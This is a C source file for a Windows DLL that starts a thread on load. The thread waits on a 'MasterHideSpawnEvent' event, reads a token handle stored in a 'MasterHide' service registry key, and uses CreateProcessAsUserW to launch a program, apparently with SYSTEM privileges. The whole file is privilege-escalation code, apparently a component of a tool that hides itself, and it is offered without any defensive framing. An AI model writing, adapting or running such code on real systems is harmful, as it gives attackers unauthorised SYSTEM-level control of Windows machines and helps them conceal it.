#include <Windows.h>
#pragma comment(lib, "advapi32.lib")

DWORD WINAPI SpawnSystemCmd(LPVOID a)
{
    // Wait for event
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, L"MasterHideSpawnEvent");
    if (hEvent) {
        WaitForSingleObject(hEvent, 5000);
        CloseHandle(hEvent);
    }

    // Read token handle from registry
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\MasterHide",
        0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return 1;

    DWORD handleValue = 0, size = sizeof(DWORD);
    RegQueryValueExW(hKey, L"TokenHandle", NULL, NULL, (LPBYTE)&handleValue, &size);
    RegCloseKey(hKey);

    if (!handleValue) return 1;
    HANDLE hSystemToken = (HANDLE)(ULONG_PTR)handleValue;

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"WinSta0\\Default";
    PROCESS_INFORMATION pi = { 0 };
    BOOL success = CreateProcessAsUserW(hSystemToken,
                                        L"C:\\Windows\\System32\\jtl.exe",
                                        NULL, NULL, NULL, FALSE,
                                        CREATE_NEW_CONSOLE,
                                        NULL, NULL, &si, &pi);
    if (success) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return success ? 0 : 1;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID a) {
    if (r == DLL_PROCESS_ATTACH)
        CloseHandle(CreateThread(NULL, 0, SpawnSystemCmd, NULL, 0, NULL));
    return TRUE;
}